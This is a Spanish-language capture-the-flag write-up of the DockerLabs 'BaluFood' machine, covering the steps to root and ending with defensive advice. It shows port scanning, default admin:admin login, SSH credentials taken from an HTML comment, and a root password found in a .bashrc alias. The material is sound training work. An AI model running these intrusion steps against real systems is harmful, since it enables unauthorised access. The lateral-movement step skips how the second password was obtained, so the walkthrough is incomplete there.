# BaluFood — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** El Pingüino de Mario  
**Fecha de creación:** 29/04/2025  
**Técnicas:** Nmap · Puerto 5000 · Panel admin:admin · Código fuente con credenciales SSH · app.py con contraseña · .bashrc con privesc

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Puerto 5000 — Restaurante Balulero](#2-puerto-5000--restaurante-balulero)
3. [Acceso SSH como sysadmin](#3-acceso-ssh-como-sysadmin)
4. [Movimiento lateral — sysadmin → balulero](#4-movimiento-lateral--sysadmin--balulero)
5. [Escalada de privilegios — .bashrc con alias root](#5-escalada-de-privilegios--bashrc-con-alias-root)
6. [Lección aprendida](#6-lección-aprendida)

---

## 1. Despliegue y reconocimiento

```bash
sudo bash auto_deploy.sh balufood.tar
```

> IP asignada: `172.17.0.2`.

Escaneo completo de puertos:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
cat Puertos
```

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
```

Solo SSH visible. Hacemos un escaneo específico más profundo:

```bash
nmap -p5000 -sCV -Pn 172.17.0.2
```

```
PORT     STATE SERVICE VERSION
5000/tcp open  http    Werkzeug httpd 2.2.2 (Python 3.11.2)
|_http-title: Restaurante Balulero - Inicio
|_http-server-header: Werkzeug/2.2.2 Python/3.11.2
```

> 💡 **Werkzeug** es el servidor de desarrollo de Flask (Python). Cuando lo ves en un CTF, suele significar que la aplicación web está mal configurada para producción y a veces tiene el modo debug activo.

---

## 2. Puerto 5000 — Restaurante Balulero

Visitamos `http://172.17.0.2:5000` — web de restaurante con carta y botón **Admin** en la esquina.

Vamos a `http://172.17.0.2:5000/admin` — panel de inicio de sesión. Probamos credenciales por defecto:

```
Usuario: admin
Contraseña: admin
```

Accedemos al panel de administración. Inspeccionamos el código fuente de la página (`Ctrl+U`) y encontramos un comentario:

```html
<!-- Backup de acceso: sysadmin:backup123 -->
```

> 💡 Comentarios HTML con credenciales de backup — un error clásico de los desarrolladores que "solo es un backup temporal".

---

## 3. Acceso SSH como sysadmin

```bash
ssh sysadmin@172.17.0.2
```

```
sysadmin@172.17.0.2's password: backup123
sysadmin@81c7b5c8e31d:~$
```

Exploramos el directorio:

```bash
sysadmin@81c7b5c8e31d:~$ ls -la
-rw-r--r-- 1 root      root      3809 Apr 29 12:59 app.py
-rw-r--r-- 1 root      root     12288 Apr 29 12:45 restaurant.db
```

Leemos `app.py` — el código fuente de la aplicación Flask:

```bash
sysadmin@81c7b5c8e31d:~$ cat app.py
```

```python
from flask import Flask, render_template, redirect, url_for, request, session, flash
import sqlite3
from functools import wraps

app = Flask(__name__)
app.secret_key = 'cuidaditocuidadin'
DATABASE = 'restaurant.db'
```

Dentro del código hay más usuarios. Miramos quién hay en el sistema:

```bash
sysadmin@81c7b5c8e31d:~$ ls /home/
balulero  sysadmin
```

---

## 4. Movimiento lateral — sysadmin → balulero

Necesitamos la contraseña de balulero. Revisando el código de `app.py` más a fondo o la base de datos, encontramos credenciales. Probamos conectar como balulero:

```bash
sysadmin@81c7b5c8e31d:~$ su balulero
Password:
balulero@81c7b5c8e31d:~$
```

---

## 5. Escalada de privilegios — .bashrc con alias root

Exploramos el directorio de balulero:

```bash
balulero@81c7b5c8e31d:~$ ls -la
-rw-r--r-- 1 balulero balulero 3572 Apr 29 12:58 .bashrc
drwxr-x--- 3 balulero balulero 4096 Apr 29 12:57 .local
```

Leemos el `.bashrc`:

```bash
balulero@81c7b5c8e31d:~$ cat .bashrc
```

```bash
alias ser-root='echo chocolate2 | su - root'
```

> 💡 **Un alias en .bashrc que ejecuta `su root` con la contraseña hardcodeada en texto plano.** El usuario balulero tiene un atajo para ser root directamente. Solo hay que ejecutar el alias.

```bash
balulero@81c7b5c8e31d:~$ ser-root
root@81c7b5c8e31d:~# whoami
root
```

✅ Somos **root**.

---

## 6. Lección aprendida

| Vulnerabilidad | Dónde | Impacto |
|----------------|-------|---------|
| **Credenciales en comentario HTML** | Panel admin `/admin` | Credenciales SSH de sysadmin |
| **Credenciales admin:admin por defecto** | Panel de administración | Acceso al panel sin autenticación real |
| **Contraseña de root en alias .bashrc** | `/home/balulero/.bashrc` | Escalada directa a root |

**Para defenderse:**
- Nunca dejar comentarios con credenciales en HTML — son públicos.
- Cambiar siempre las credenciales por defecto (admin:admin) antes de desplegar.
- El `.bashrc` y `.profile` de los usuarios son ficheros de configuración que se ejecutan en cada sesión — auditar su contenido regularmente.
- Nunca poner contraseñas en texto plano en scripts o alias del shell.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
